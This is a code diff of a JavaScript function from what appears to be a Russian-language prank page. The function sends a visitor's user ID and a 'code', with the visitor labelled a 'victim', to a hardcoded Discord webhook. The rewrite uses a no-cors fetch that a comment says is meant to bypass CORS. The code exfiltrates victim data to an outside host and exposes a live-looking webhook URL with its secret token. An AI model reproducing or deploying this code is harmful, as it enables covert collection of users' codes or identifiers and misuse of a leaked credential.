@@ -64,13 +64,23 @@
 
         // 2. ФУНКЦИЯ ОТПРАВКИ В ДИСКОРД
 function sendToWebhook() {
-    const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy");
-    request.setRequestHeader('Content-type', 'application/json');
-    const params = {
-        content: `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``
-    };
-    request.send(JSON.stringify(params));
+    const webhookUrl = "https://discord.com/api/webhooks/1491823650062729226/cIgBYFw27PKEdyEJbHhHwfsxICL5I_GJHfGcxFT0a2vVQGT2yZJBAf5cWHPoAp5Plyxy";
+    
+    // Формируем текст сообщения
+    const content = `🚨 **Пользователь попался!**\n👤 Жертва: <@${userId || "Неизвестный ID"}>\n🔑 Код: \`${extraInfo || "Нет данных"}\``;
+
+    // Создаем объект формы
+    const formData = new FormData();
+    formData.append('content', content);
+
+    // Отправляем через fetch, но БЕЗ JSON-заголовков
+    fetch(webhookUrl, {
+        method: 'POST',
+        mode: 'no-cors', // Это критично для обхода CORS
+        body: formData
+    }).then(() => {
+        console.log("Данные ушли в бездну (надеемся, в Дискорд)");
+    }).catch(e => console.error("Ошибка отправки:", e));
 }
 
         function startRickRoll() {
